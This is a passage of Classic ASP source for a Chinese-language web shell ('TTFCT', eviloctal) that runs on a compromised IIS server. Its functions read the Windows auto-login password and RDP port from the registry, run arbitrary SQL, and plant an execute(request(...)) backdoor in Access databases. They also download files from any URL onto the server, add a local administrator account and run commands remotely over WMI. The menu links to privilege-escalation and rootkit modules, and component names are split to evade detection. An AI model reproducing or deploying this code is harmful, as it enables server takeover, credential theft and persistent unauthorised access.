		Dim i, sa, objWshSysEnv, aryExEnvList, strExEnvList, intCpuNum, strCpuInfo, strOS
		Set sa = Server.CreateObject("She"&T&"ll.Appl"&T&"ication")
		strExEnvList = "SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$" & _
					   "PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
		aryExEnvList = Split(strExEnvList, "$")
		
		Set objWshSysEnv = wsX.Environment("SYSTEM")
		chkErr(Err)

		intCpuNum = Request.ServerVariables("NUMBER_OF_PROCESSORS")
		If IsNull(intCpuNum) Or intCpuNum = "" Then
			intCpuNum = objWshSysEnv("NUMBER_OF_PROCESSORS")
		End If
		strOS = Request.ServerVariables("OS")
		If IsNull(strOS) Or strOS = "" Then
			strOS = objWshSysEnv("OS")
			strOs = strOs & "(有可能是 Windows2003 哦)"
		End If
		strCpuInfo = objWshSysEnv("PROCESSOR_IDENTIFIER")

		echo "<a href=javascript:showHideMe(srvInf);>服务器相关参数:</a>"
		echo "<ol id=srvInf><hr/>"
		echo "<li>服务器名: " & Request.ServerVariables("SERVER_NAME") & "</li>"
		echo "<li>服务器IP: " & Request.ServerVariables("LOCAL_ADDR") & "</li>"
		echo "<li>服务端口: " & Request.ServerVariables("SERVER_PORT") & "</li>"
		echo "<li>服务器内存: " & getTheSize(sa.GetSystemInformation("PhysicalMemoryInstalled")) & "</li>"
		echo "<li>服务器时间: " & Now & "</li>"
		echo "<li>服务器软件: " & Request.ServerVariables("SERVER_SOFTWARE") & "</li>"
		echo "<li>脚本超时时间: " & Server.ScriptTimeout & "</li>"
		echo "<li>服务器CPU数量: " & intCpuNum & "</li>"
		echo "<li>服务器CPU详情: " & strCpuInfo & "</li>"
		echo "<li>服务器操作系统: " & strOS & "</li>"
		echo "<li>服务器解译引擎: " & ScriptEngine & "/" & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion & "</li>"
		echo "<li>本文件实际路径: " & Request.ServerVariables("PATH_TRANeviloctalATED") & "</li>"
		echo "<hr/></ol>"
		
		echo "<br/><a href=javascript:showHideMe(srvEnvInf);>服务器相关参数:</a>"
		echo "<ol id=srvEnvInf><hr/>"
		For i = 0 To UBound(aryExEnvList)
			echo "<li>" & aryExEnvList(i) & ": " & wsX.ExpandEnvironmentStrings("%" & aryExEnvList(i) & "%") & "</li>"
		Next
		echo "<hr/></ol>"
		
		Set sa = Nothing
		Set objWshSysEnv = Nothing
	End Sub

	Sub getSrvDrvInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim objTheDrive
		echo "<br/><a href=javascript:showHideMe(srvDriveInf);>服务器磁盘信息:</a>"
		echo "<ol id=srvDriveInf><hr/>"
		echo "<div id='fsoDriveList'>"
		echo "<span>盘符</span><span>类型</span><span>卷标</span><span>文件系统</span><span>可用空间</span><span>总空间</span><br/>"
		For Each objTheDrive In fsoX.Drives
			echo "<span>" & objTheDrive.DriveLetter & "</span>"
			echo "<span>" & getDriveType(objTheDrive.DriveType) & "</span>"
			If UCase(objTheDrive.DriveLetter) = "A" Then
				echo "<br/>"
			 Else
				echo "<span>" & objTheDrive.VolumeName & "</span>"
				echo "<span>" & objTheDrive.FileSystem & "</span>"
				echo "<span>" & getTheSize(objTheDrive.FreeSpace) & "</span>"
				echo "<span>" & getTheSize(objTheDrive.TotalSize) & "</span><br/>"
			End If
			If Err Then
				Err.Clear
				echo "<br/>"
			End If
		Next
		echo "</div><hr/></ol>"
		Set objTheDrive = Nothing
	End Sub
	
	Sub getSiteRootInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim objTheFolder
		Set objTheFolder = fsoX.GetFolder(Server.MapPath("/"))
		echo "<br/><a href=javascript:showHideMe(siteRootInfo);>站点根目录信息:</a>"
		echo "<ol id=siteRootInfo><hr/>"
		echo "<li>物理路径: " & Server.MapPath("/") & "</li>"
		echo "<li>当前大小: " & getTheSize(objTheFolder.Size) & "</li>"
		echo "<li>文件数: " & objTheFolder.Files.Count & "</li>"
		echo "<li>文件夹数: " & objTheFolder.SubFolders.Count & "</li>"
		echo "<li>创建日期: " & objTheFolder.DateCreated & "</li>"
		echo "<li>最后访问日期: " & objTheFolder.DateLastAccessed & "</li>"
		echo "</ol>"
	End Sub
	
	Sub getTerminalInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim terminalPortPath, terminalPortKey, termPort
		Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
		Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword

		terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
		terminalPortKey = "PortNumber"
		termPort = wsX.RegRead(terminalPortPath & terminalPortKey)

		echo "终端服务端口及自动登录信息<hr/><ol>"
		If termPort = "" Or Err.Number <> 0 Then 
			echo  "无法得到终端服务端口, 请检查权限是否已经受到限制.<br/>"
		 Else
			echo  "当前终端服务端口: " & termPort & "<br/>"
		End If
		
		autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
		autoLoginEnableKey = "AutoAdminLogon"
		autoLoginUserKey = "DefaultUserName"
		autoLoginPassKey = "DefaultPassword"
		isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
		If isAutoLoginEnable = 0 Then
			echo  "系统自动登录功能未开启<br/>"
		Else
			autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
			echo  "自动登录的系统帐户: " & autoLoginUsername & "<br>"
			autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
			If Err Then
				Err.Clear
				echo  "False"
			End If
			echo  "自动登录的帐户密码: " & autoLoginPassword & "<br>"
		End If
		echo "</ol>"
	End Sub

	Sub PageLogin()
		Dim theAct, passWord
		theAct = Request("theAct")
		passWord = Request("userPassword")
		
		showTitle("管理登录")
		
		If theAct = "chkLogin" Then
			If passWord = userPassword Then
				Session(m & "userPassword") = passWord
				redirectTo("?eviloctal=PageList")
			 Else
				echo "<script language=javascript>alert('不要乱来哦');history.back();</script>"
			End If
		End If
		
		echo "<style>body{margin:8;text-align:center;}</style>"
		echo "TTFCT全功能版<hr/>"
		echo "<body onload=document.forms[0].userPassword.focus();>"
		echo "<form method=post onsubmit=this.Submit.disabled=true;>"
		echo "<input name=userPassword class=input type=password size=30> "
		echo "<input type=hidden name=theAct value=chkLogin>"
		echo "<input type=submit name=Submit value=""" & HtmlEncode(myName) & """ class=input>"
		echo "<hr/>"
                echo "</form>"
		echo "<body>"
		
	End Sub

	Sub pageMsDataBase()
		Dim theAct, sqlStr
		theAct = Request("theAct")
		sqlStr = Request("sqlStr")
		
		showTitle("mdb+mssql数据库操作页")
		
		If sqlStr = "" Then
			If Session(m & "sqlStr") = "" Then
				sqlStr = "e:\eviloctalTop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
			 Else
				sqlStr = Session(m & "sqlStr")
			End If
		End If
		Session(m & "sqlStr") = sqlStr
		
		echo "<style>body{margin:8;}</style>"
		echo "<form method=post action='?eviloctal=MsDataBase&theAct=showTables' onSubmit='this.Submit.disabled=true;'>"
		echo "<a href='?eviloctal=MsDataBase'>mdb+mssql数据库操作</a><br/>"
		echo "<input name=sqlStr type=text id=sqlStr value=""" & sqlStr & """ size=60 style='width:80%;'>"
		echo "<input name=theAct type=hidden value=showTables><br/>"
		echo "<input type=Submit name=Submit value=' 提交 '>"
		echo "<input type=button name=Submit2 value=' 插入 ' onclick=""if(confirm('这里是在ACESS数据里插入ASP\n默认密码是" & clientPassword & "\n插入后可以使用的前提是\n数据库是asp后缀, 并且没有错乱asp代码\n确认操作吗?')){location.href='?eviloctal=MsDataBase&theAct=inject&sqlStr='+this.form.sqlStr.value;this.disabled=true;}"">"
		echo "<input type=button value=' 示例 ' onclick=""this.form.sqlStr.value='e:\\eviloctalTop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';"">"
		echo "</form>"
		echo "<hr/>注: 插入只针对ACCESS操作, 要浏览ACCESS在表单中的写法是""d:\bbs.mdb"", SQL据库写法是""sql:连接字符串"", 不要忘写sql:。<hr/>"

		Select Case theAct
			Case "showTables"
				showTables()
			Case "query"
				showQuery()
			Case "inject"
				accessInject()
		End Select
		
		echo ""
	End Sub
	
	Sub showTables()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim conn, sqlStr, rsTable, rsColumn, connStr, tablesStr
		sqlStr = Request("sqlStr")
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			connStr = Mid(sqlStr, 5)
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
		End If
		Set conn = Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction")
		
		conn.Open connStr
		chkErr(Err)
		
		tablesStr = getTableList(conn, sqlStr, rsTable)
		
		echo "<a href=""?eviloctal=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>数据库表结构查看:</a><br/>"
		echo tablesStr & "<hr/>"
		echo "<a href=""?eviloctal=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>转到SQL命令执行</a><hr/>"

		Do Until rsTable.Eof
			Set rsColumn = conn.OpenSchema(4, Array(Empty, Empty, rsTable("Table_Name").value))
			echo "<table border=0 cellpadding=0 cellspacing=0><tr><td height=22 colspan=6><b>" & rsTable("Table_Name") & "</b></td>"
			echo "</tr><tr><td colspan=6><hr/></td></tr><tr align=center>"
			echo "<td>字段名</td><td>类型</td><td>大小</td><td>精度</td><td>允许为空</td><td>默认值</td></tr>"
			echo "<tr><td colspan=6><hr/></td></tr>"

			Do Until rsColumn.Eof
				echo "<tr align=center>"
				echo "<td align=Left>&nbsp;" & rsColumn("Column_Name") & "</td>"
				echo "<td width=80>" & getDataType(rsColumn("Data_Type")) & "</td>"
				echo "<td width=70>" & rsColumn("Character_Maximum_Length") & "</td>"
				echo "<td width=70>" & rsColumn("Numeric_Precision") & "</td>"
				echo "<td width=70>" & rsColumn("Is_Nullable") & "</td>"
				echo "<td width=80>" & rsColumn("Column_Default") & "</td>"
				echo "</tr>"
				rsColumn.MoveNext
			Loop
			
			echo "<tr><td colspan=6><hr/></td></tr></table>"
			rsTable.MoveNext
		Loop

		echo "<hr/>"

		conn.Close
		Set conn = Nothing
		Set rsTable = Nothing
		Set rsColumn = Nothing
	End Sub
	
	Sub showQuery()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, j, rs, sql, page, conn, sqlStr, connStr, rsTable, tablesStr, theTable
		sql = Request("sql")
		page = Request("page")
		sqlStr = Request("sqlStr")
		theTable = Request("theTable")
		
		If Not IsNumeric(page) or page = "" Then
			page = 1
		End If
		
		If sql = "" And theTable <> "" Then
			sql = "Select top " & dbSelectNumber & " * from [" & theTable & "]"
		End If
		
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			connStr = Mid(sqlStr, 5)
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
		End If
		Set rs = Server.CreateObject("Adodb.RecordSet")
		Set conn = Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction")
	
		conn.Open connStr
		chkErr(Err)
		
		tablesStr = getTableList(conn, sqlStr, rsTable)

		echo "<a href=""?eviloctal=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>数据库表结构查看:</a><br/>"
		echo tablesStr & "<hr/>"
		echo "<a href=?eviloctal=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & ">SQL命令执行及查看</a>"
		echo "<br/><form method=post action=""?eviloctal=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>"
		echo "<input name=sql type=text id=sql value=""" & HtmlEncode(sql) & """ size=60>"
		echo "<input type=Submit name=Submit4 value=执行查询><hr/>"

		If sql <> "" And Left(LCase(sql), 7) = "select " Then
			rs.Open sql, conn, 1, 1
			chkErr(Err)
			rs.PageSize = 20
			If Not rs.Eof Then
				rs.AbsolutePage = page
			End If
			If rs.Fields.Count>0 Then
				echo "<br><table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""98%"">"
				echo "<tr>"
				echo "<td height=""22"" align=""center"" class=""tr"" colspan=""" & rs.Fields.Count & """>SQL操作 - 执行结果</td>"
				echo "</tr>"
				echo "<tr>"
				For j = 0 To rs.Fields.Count-1
					echo "<td height=""22"" align=""center"" class=""td""> " & rs.Fields(j).Name & " </td>"
				Next
				For i = 1 To 20
					If rs.Eof Then
						Exit For
					End If
					echo "</tr>"
					echo "<tr valign=top>"
					For j = 0 To rs.Fields.Count-1
						echo "<td height=""22"" align=""center"">" & HtmlEncode(fixNull(rs(j))) & "</td>"
					Next
					echo "</tr>"
					rs.MoveNext
				Next
			End If
			echo "<tr>"
			echo "<td height=""22"" align=""center"" class=""td"" colspan=""" & rs.Fields.Count & """>"
			For i = 1 To rs.PageCount
				echo Replace("<a href=""?eviloctal=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & "&page=" & i & """><font {$font" & i & "}>" & i & "</font></a> ", "{$font" & page & "}", "class=warningColor")
			Next
			echo "</td></tr></table>"
			rs.Close
		 Else
		 	If sql <> "" Then
				conn.Execute(sql)
				chkErr(Err)
				echo "<center><br>执行完毕!</center>"
			End If
		End If

		echo "</form><hr/>"

		conn.Close
		Set rs = Nothing
		Set conn = Nothing
		Set rsTable = Nothing
	End Sub
	
	Function getDataType(typeId)
		Select Case typeId
			Case 130
				getDataType = "文本"
			Case 2
				getDataType = "整型"
			Case 3
				getDataType = "长整型"
			Case 7
				getDataType = "日期/时间"
			Case 5
				getDataType = "双精度型"
			Case 11
				getDataType = "是/否"
			Case 128
				getDataType = "OLE 对象"
			Case Else
				getDataType = typeId
		End Select
	End Function
	
	Sub accessInject()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim rs, conn, sqlStr, connStr
		sqlStr = Request("sqlStr")
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			showErr("插入只对ACCESS数据库有效!")
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
		End If
		Set rs = Server.CreateObject("Adodb.RecordSet")
		Set conn = Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction")

		conn.Open connStr
		chkErr(Err)

		If notdownloadsExists = True Then
			conn.Execute("drop table notdownloads")
		End If

		conn.Execute("create table notdownloads(notdownloads oleobject)")

		rs.Open "notdownloads", conn, 1, 3
		rs.AddNew
		rs("notdownloads").AppendChunk(ChrB(Asc("<")) & ChrB(Asc("%")) & ChrB(Asc("e")) & ChrB(Asc("x")) & ChrB(Asc("e")) & ChrB(Asc("c")) & ChrB(Asc("u")) & ChrB(Asc("t")) & ChrB(Asc("e")) & ChrB(Asc("(")) & ChrB(Asc("r")) & ChrB(Asc("e")) & ChrB(Asc("q")) & ChrB(Asc("u")) & ChrB(Asc("e")) & ChrB(Asc("s")) & ChrB(Asc("t")) & ChrB(Asc("(")) & ChrB(Asc("""")) & ChrB(Asc(clientPassword)) & ChrB(Asc("""")) & ChrB(Asc(")")) & ChrB(Asc(")")) & ChrB(Asc("%")) & ChrB(Asc(">")) & ChrB(Asc(" ")))
	    rs.Update
    	rs.Close
		
		echo "<script language=""javascript"">alert('插入成功!');history.back();</script>"
		
		conn.Close
		Set rs = Nothing
		Set conn = Nothing
	End Sub
	
	Function getTableList(conn, sqlStr, rsTable)
		Set rsTable = conn.OpenSchema(20, Array(Empty, Empty, Empty, "table"))

		Do Until rsTable.Eof
			getTableList = getTableList & "<a href=""?eviloctal=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&theTable=" & UrlEncode(rsTable("Table_Name")) & """>[" & rsTable("Table_Name") & "]</a>&nbsp;"
			rsTable.MoveNext
		Loop
		rsTable.MoveFirst
	End Function

	Sub PageObjOnSrv()
		Dim i, objTmp, txtObjInfo, strObjectList, strDscList
		txtObjInfo = Trim(Request("txtObjInfo"))

		strObjectList = "MSWC.AdRotator,MSWC.BrowserType,MSWC.NextLink,MSWC.Tools,MSWC.Status,MSWC.Counters,IISSample.ContentRotator," & _
						"IISSample.PageCounter,MSWC.PermissionChecker,ADO"&T&"DB.Conne"&T&"ction,SoftArtisans.FileUp,SoftArtisans.FileManager,LyfUpload.UploadFile," & _
						"Persits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persits.MailSender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer," & _
						"IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftArtisans.ImageGen,W3Image.Image," & _
						"Scripting.FileSystemObject,Adodb.Stream,She"&T&"ll.Appl"&T&"ication,WScri"&T&"pt.She"&T&"ll,Wscript.Network"
		strDscList = "广告轮换,浏览器信息,内容链接库,,,计数器,内容轮显,,权限检测,ADO 数据对象,SA-FileUp 文件上传,SoftArtisans 文件管理," & _
					 "刘云峰的文件上传组件,ASPUpload 文件上传,Dimac 文件上传,Dimac JMail 邮件收发,虚拟 SMTP 发信,ASPemail 发信,ASPmail 发信,dkQmail 发信," & _
					 "Geocel 发信,IISmail 发信,SmtpMail 发信,SA 的图像读写,Dimac 的图像读写组件," & _
					 "FSO,Stream 流,,,"

		aryObjectList = Split(strObjectList, ",")
		aryDscList = Split(strDscList, ",")

		showTitle("服务器组件支持情况检测")

		echo "其他组件支持情况检测<br/>"
		echo "在下面的输入框中输入你要检测的组件的ProgId或ClassId。<br/>"
		echo "<form method=post>"
		echo "<input name=txtObjInfo size=30 value=""" & txtObjInfo & """><input name=theAct type=submit value=我要检测>"
		echo "</form>"

		If Request("theAct") = "我要检测" And txtObjInfo <> "" Then
			Call getObjInfo(txtObjInfo, "")
		End If
		
		echo "<hr/>"
		echo "<lu>组件名称 ┆ 支持及其它"

		For i = 0 To UBound(aryDscList)
			Call getObjInfo(aryObjectList(i), aryDscList(i))
		Next

		echo "</lu><hr/>"		
	End Sub
	
	Sub getObjInfo(strObjInfo, strDscInfo)
		Dim objTmp

		If isDebugMode = False Then
			On Error Resume Next
		End If

		echo "<li> " & strObjInfo
		If strDscInfo <> "" Then
			echo " (" & strDscInfo & "组件)"
		End If

		echo " ┆ "

		Set objTmp = Server.CreateObject(strObjInfo)
		If Err <> -2147221005 Then
			echo "√ "
			echo "Version: " & objTmp.Version & "; "
			echo "About: " & objTmp.About
		 Else
			echo "×"
		End If
		echo "</li>"

		If Err Then
			Err.Clear
		End If
		
		Set objTmp = Nothing
	End Sub

	Sub PageOtherTools()
		Dim theAct
		theAct = Request("theAct")

		showTitle("一些零碎的小东西")

		Select Case theAct
			Case "downFromUrl"
				downFromUrl()
				Response.End
			Case "addUser"
				AddUser Request("userName"), Request("passWord")
				Response.End
			Case "readReg"
				readReg()
				Response.End
		End Select

		echo "数制转换:<hr/>"
		echo "<input name=text1 value=字符和数字转10和16进制 size=25 id=text9>"
		echo "<input type=button onclick=main(); value=给我转>"
		echo "<input value=16进制转10进制和字符 size=25 id=vars>"
		echo "<input type=button onClick=main2(); value=给我转>"
		echo "<hr/>"
		
		echo "下载到服务器:<hr/>"
		echo "<form method=post target=_blank>"
		echo "<input name=theUrl value='http://' size=80><input type=submit value=' 下载 '><br/>"
		echo "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		echo "<input type=checkbox name=overWrite value=2>存在覆盖"
		echo "<input type=hidden value=downFromUrl name=theAct>"
		echo "</form>"
		echo "<hr/>"
		
		echo "文件编辑:<hr/>"
		echo "<form method=post action='?' target=_blank>"
		echo "<input size=80 name=thePath value=""" & HtmlEncode(Request.ServerVariables("PATH_TRANeviloctalATED")) & """>"
		echo "<input type=hidden value=showEdit name=theAct>"
		echo "<select name=eviloctal><option value=AppFileExplorer>用Stream</option><option value=FsoFileExplorer>用FSO</option></select>"
		echo "<input type=submit value=' 打开 '>"
		echo "</form><hr/>"
		
		echo "管理帐号添加(成功率极低):<hr/>"
		echo "<form method=post target=_blank>"
		echo "<input type=hidden value=addUser name=theAct>"
		echo "<input name=userName value='eviloctalTop' size=39>"
		echo "<input name=passWord type=password value='eviloctalTop' size=39>"
		echo "<input type=submit value=' 添加 '>"
		echo "</form><hr/>"
		
		echo "注册表键值读取(<a href=javascript:showHideMe(regeditInfo);>资料</a>):<hr/>"
		echo "<form method=post target=_blank>"
		echo "<input type=hidden value=readReg name=theAct>"
		echo "<input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
		echo "<input type=submit value=' 读取 '>"
		echo "<span id=regeditInfo style='display:none;'><hr/>"
		echo "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {不显示上次登录用户}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=缺省,1=匿名用户无法列举本机用户列表,2=匿名用户无法连接本机IPC$共享}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {禁止默认共享}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {关闭网络共享}<br/>"
		echo "HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {启用TCP/IP筛选(所有试配器)}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {允许IP路由}<br/>"
		echo "-------以下似乎要看绑定的网卡,不知道是否准确---------<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {默认网关}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {首DNS}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {允许的TCP/IP端口}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {允许的UDP端口}<br/>"
		echo "-----------OVER--------------------<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {共几块活动网卡}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {当前网卡的序列(把上面的替换)}<br/>"
		echo "==========================================================<br/>以上资料由kEvin1986提供"
		echo "</span>"
		echo "</form><hr/>"
		
		echo "<script language=vbs>" & vbNewLine
		echo "sub main()" & vbNewLine
		echo "base=document.all.text9.value" & vbNewLine
		echo "If IsNumeric(base) Then" & vbNewLine
		echo "cc=hex(cstr(base))" & vbNewLine
		echo "alert(""10进制为""&base)" & vbNewLine
		echo "alert(""16进制为""&cc)" & vbNewLine
		echo "exit sub" & vbNewLine
		echo "end if" & vbNewLine
		echo "aa=asc(cstr(base))" & vbNewLine
		echo "bb=hex(aa)" & vbNewLine
		echo "alert(""10进制为""&aa)" & vbNewLine
		echo "alert(""16进制为""&bb)" & vbNewLine
		echo "end sub" & vbNewLine
		echo "sub main2()" & vbNewLine
		echo "If document.all.vars.value<>"""" Then" & vbNewLine
		echo "Dim nums,tmp,tmpstr,i" & vbNewLine
		echo "nums=document.all.vars.value" & vbNewLine
		echo "nums_len=Len(nums)" & vbNewLine
		echo "For i=1 To nums_len" & vbNewLine
		echo "tmp=Mid(nums,i,1)" & vbNewLine
		echo "If IsNumeric(tmp) Then" & vbNewLine
		echo "tmp=tmp * 16 * (16^(nums_len-i-1))" & vbNewLine
		echo "Else" & vbNewLine
		echo "If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then" & vbNewLine
		echo "alert(""你输入的数值中有非法字符，16进制数只包括1～9及a～f之间的字符，请重新输入。"")" & vbNewLine
		echo "exit sub" & vbNewLine
		echo "End If" & vbNewLine
		echo "tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))" & vbNewLine
		echo "End If" & vbNewLine
		echo "tmpstr=tmpstr+tmp" & vbNewLine
		echo "Next" & vbNewLine
		echo "alert(""转换的10进制为:""&tmpstr&""其字符值为:""&chr(tmpstr))" & vbNewLine
		echo "End If" & vbNewLine
		echo "end sub" & vbNewLine
		echo "</script>" & vbNewLine

		echo ""
	End Sub
	
	Sub downFromUrl()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim Http, theUrl, thePath, stream, fileName, overWrite
		theUrl = Request("theUrl")
		thePath = Request("thePath")
		overWrite = Request("overWrite")
		Set stream = Server.CreateObject("Adodb.Stream")
		Set Http = Server.CreateObject("MSXML2.XMLHTTP")
		
		If overWrite <> 2 Then
			overWrite = 1
		End If
		
		Http.Open "GET", theUrl, False
		Http.Send()
		If Http.ReadyState <> 4 Then 
			Exit Sub
		End If
		
		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Http.ResponseBody
			.Position = 0
			.SaveToFile thePath, overWrite
			If Err.Number = 3004 Then
				Err.Clear
				fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
				If fileName = "" Then
					fileName = "index.htm.txt"
				End If
				thePath = thePath & "\" & fileName
				.SaveToFile thePath, overWrite
			End If
			.Close
		End With
		chkErr(Err)
		
		alertThenClose("文件 " & Replace(thePath, "\", "\\") & " 下载成功!")
		
		Set Http = Nothing
		Set Stream = Nothing
	End Sub
	
	Sub AddUser(strUser, strPassword)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim computer, theUser, theGroup
		Set computer = Getobject("WinNT://.")
		Set theGroup = GetObject("WinNT://./Administrators,group")
		
		Set theUser = computer.Create("User", strUser)
		theUser.SetPassword(strPassword)
		chkErr(Err)
		theUser.SetInfo
		chkErr(Err)
		theGroup.Add theUser
		chkErr(Err)
		
		Set theUser = Nothing
		Set computer = Nothing
		Set theGroup = Nothing
		
		echo getUserInfo(strUser)
	End Sub
	
	Sub readReg()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, thePath, theArray
		thePath = Request("thePath")
'		echo thePath & "<br/>"
		theArray = wsX.RegRead(thePath)
		If IsArray(theArray) Then
			For i = 0 To UBound(theArray)
				echo "<li>" & theArray(i)
			Next
		 Else
			echo "<li>" & theArray
		End If
		chkErr(Err)
	End Sub

Sub mycom()
echo "<form name=""form1"" method=""post"" action=""?eviloctal=mycom"">"
echo "  远程执行命令"
echo "<input name=""ok"" type=""text"" id=""ok"" value=""&quot;192.168.2.1&quot;,&quot;root/cimv2&quot;,&quot;administrator&quot;,&quot;xiaolu&quot;"" size=""70"">"
echo "  <input type=""submit"" name=""Submit"" value=""提交"">"
echo "</form>"
if request("ok")<>"" then
set ww=server.createobject("wbemscripting.swbemlocator")
set cc=ww.connectserver(request("ok"))
set ss=cc.get("Win32_ProcessStartup")
Set oC=ss.SpawnInstance_
oC.ShowWindow=12
Set pp=cc.get("Win32_Process")
Response.Write pp.create("net user",null,oC,intProcessID)
Response.Write "<br>"&intProcessID
Response.end
end if
end sub



	Sub PageList()
		showTitle("功能模块列表")

		echo "<base target=_blank>"
		echo "TTFCT增强版<hr/>"
		echo "<ol><li><a href='?eviloctal=ServiceList'>系统服务信息</a></li>"
		echo "<br/>"
		echo "<li><a href='?eviloctal=infoAboutSrv'>服务器相关数据</a><br/>("
		echo "<a href='?eviloctal=infoAboutSrv&theAct=getSrvInfo'>系统参数</a>,"
		echo "<a href='?eviloctal=infoAboutSrv&theAct=getSrvDrvInfo'>系统磁盘</a>,"
		echo "<a href='?eviloctal=infoAboutSrv&theAct=getSiteRootInfo'>站点文件夹</a>,"
		echo "<a href='?eviloctal=infoAboutSrv&theAct=getTerminalInfo'>终端端口&自动登录</a>)</li>"
		echo "<li><a href='?eviloctal=objOnSrv'>服务器组件探针</a></li>"
		echo "<li><a href='?eviloctal=userList'>系统用户及用户组信息</a></li>"
		echo "<li><a href='?eviloctal=CSInfo'>客户端服务器交互信息</a></li>"
		echo "<li><a href='?eviloctal=WsCmdRun'>WScri"&T&"pt.She"&T&"ll程序运行器</a></li>"
		echo "<li><a href='?eviloctal=SaCmdRun'>She"&T&"ll.Appl"&T&"ication程序运行器</a></li>"
		echo "<li><a href='?eviloctal=FsoFileExplorer'>FSO文件浏览操作器</a></li>"
		echo "<li><a href='?eviloctal=AppFileExplorer'>She"&T&"ll.Appl"&T&"ication文件浏览操作器</a></li>"
		echo "<li><a href='?eviloctal=MsDataBase'>微软数据库查看/操作器</a></li>"
		echo "<li><a href='?eviloctal=PageAddToMdb'>文件夹打包/解开器</a></li>"
		echo "<li><a href='?eviloctal=TxtSearcher'>文本文件搜索器</a></li>"
		echo "<li><a href='?eviloctal=OtherTools'>一些零碎的小东西</a></li>"
                echo "<li><a href='?ado=newado'>Ado Exploit</a></li>"
		echo "<li><a href='?sql=yes'>SqlRootKit 3.0</a></li>"
		echo "<li><a href='?eviloctal=mycom'>wmi远程执行命令</a></li>"
                echo "<li><a href='?su=su'>SerV-U-ASP提权</a></li>"
                echo "<li><a href='?kill=yes'>干掉非本人ASP木马</a></li>"
		echo "</ol>"
